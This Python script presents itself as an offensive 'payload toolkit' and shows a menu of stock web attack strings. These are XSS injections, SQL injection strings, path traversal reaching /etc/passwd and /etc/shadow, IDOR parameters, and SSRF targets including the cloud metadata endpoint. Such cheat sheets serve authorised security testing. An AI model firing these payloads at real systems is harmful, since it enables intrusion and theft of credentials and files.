#!/usr/bin/env python3

import os
import time

CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
MAGENTA = '\033[95m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""{RED}
██████╗  █████╗ ██╗   ██╗██╗      ██████╗ ██╗   ██╗     ███████╗ ██████╗ ██████╗  ██████╗  ███████╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██║   ██║     ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗ ██╔════╝
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║██║   ██║     █████╗  ██║   ██║██████╔╝██║   ██║ █████╗  
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██║   ██║     ██╔══╝  ██║   ██║██╔═══╝ ██║   ██║ ██╔══╝  
██║     ██║  ██║   ██║   ███████╗╚██████╔╝╚██████╔╝     ██║     ╚██████╔╝██║     ╚██████╔╝ ███████╗
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝      ╚═╝      ╚═════╝ ╚═╝      ╚═════╝  ╚══════╝
{CYAN}                                PayloadForge v2 | Cyber Offensive Toolkit
{YELLOW}                           By Karndeep Baror | @karndeepbaror (TG/IG)
{GREEN}                          Stay Ethical , Hack Strong 🇮🇳  By KK ⌷
{RESET}
""")

def animation():
    for _ in range(2):
        for dots in ['.', '..', '...']:
            clear()
            print(f"{CYAN}[🛰️] Initializing PayloadForge{dots}{RESET}")
            time.sleep(0.3)
    clear()

def ctrl_c_handler():
    print(f"\n{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{CYAN}Stay Ethical , Hack Strong 🇮🇳  By KK ⌷{RESET}")
    print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    exit()

payloads = {
    "XSS": ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert('XSS')>", "<iframe src='javascript:alert(1)'></iframe>"],
    "SQLi": ["' OR '1'='1", "admin' -- ", "\" OR \"\"=\"", "' OR SLEEP(5)--+"],
    "LFI": ["../../../../../../etc/passwd", "../../../etc/passwd%00", "/etc/passwd", "../../../../../etc/shadow"],
    "IDOR": ["?id=1", "?user=1001", "?account_id=2002", "?doc=invoice_123.pdf", "?file=userdata_007.json"],
    "SSRF": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0", "http://169.254.169.254/latest/meta-data/"]
}

def print_payloads(category):
    clear()
    print(f"{MAGENTA}--- {category} Payloads ---{RESET}\n")
    for p in payloads[category]:
        print(f"{YELLOW}- {p}{RESET}")
    input(f"\n{CYAN}Press Enter to return to menu...{RESET}")
    clear()

def main_menu():
    while True:
        print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f"{CYAN}  🛰️  PayloadForge – Main Menu{RESET}")
        print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f"{CYAN}[1] XSS Payloads{RESET}")
        print(f"{CYAN}[2] SQLi Payloads{RESET}")
        print(f"{CYAN}[3] LFI Payloads{RESET}")
        print(f"{CYAN}[4] IDOR Payloads{RESET}")
        print(f"{CYAN}[5] SSRF Payloads{RESET}")
        print(f"{RED}[6] Exit{RESET}")
        print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        choice = input(f"{YELLOW}Select Option (1-6): {RESET}").strip()

        if choice == '1': print_payloads("XSS")
        elif choice == '2': print_payloads("SQLi")
        elif choice == '3': print_payloads("LFI")
        elif choice == '4': print_payloads("IDOR")
        elif choice == '5': print_payloads("SSRF")
        elif choice == '6': ctrl_c_handler()
        else:
            print(f"{RED}Invalid Option! Try again.{RESET}")
            time.sleep(1)
            clear()

if __name__ == "__main__":
    try:
        animation()
        banner()
        main_menu()
    except KeyboardInterrupt:
        ctrl_c_handler()
